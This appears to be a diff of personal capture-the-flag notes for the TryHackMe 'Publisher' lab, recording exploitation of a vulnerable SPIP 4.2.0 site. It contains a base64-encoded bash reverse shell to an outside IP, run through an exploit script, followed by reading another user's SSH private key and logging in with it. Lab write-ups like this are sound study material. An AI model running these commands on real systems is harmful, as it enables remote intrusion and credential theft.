@@ -67,13 +67,50 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
                                                         
 
 
-SPIP 4.2.0
+### SPIP 4.2.0 - vulnable
 
 http://publisher.thm/spip/spip.php?page=backend
 http://publisher.thm/spip/spip.php?rubrique1
 http://publisher.thm/spip/spip.php?page=contact
 
 http://publisher.thm/spip/spip.php?page=login&url=%2Fspip%2Fecrire%2F&lang=fr
+
+
+### Initial access
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ python3 51536.py -u http://publisher.thm/spip -c whoami
+                                                                                                                    
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ echo -n "bash -i >& /dev/tcp/10.9.30.202/6666 0>&1" | base64 -w0 
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE=                                                                                                                    
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ python3 51536.py -u http://publisher.thm/spip -c "whoami"       
+                                                                                                                    
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ python3 51536.py -u http://publisher.thm/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE= 
+                                                                                                                    
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ python3 51536.py -u http://publisher.thm/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE= | base64 -d | bash"
+
+### Recoon get Think user key
+www-data@41c976e507f8:/home/think/.ssh$ ls
+ls
+authorized_keys
+id_rsa
+id_rsa.pub
+www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+
+###  SSH access as Think
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ chmod 400 think   
+                                                                                                                    
+┌──(duke㉿kali)-[~/Documents/THM_Publisher]
+└─$ ssh -i think think@publisher.thm
+
+
 
 
 </code>
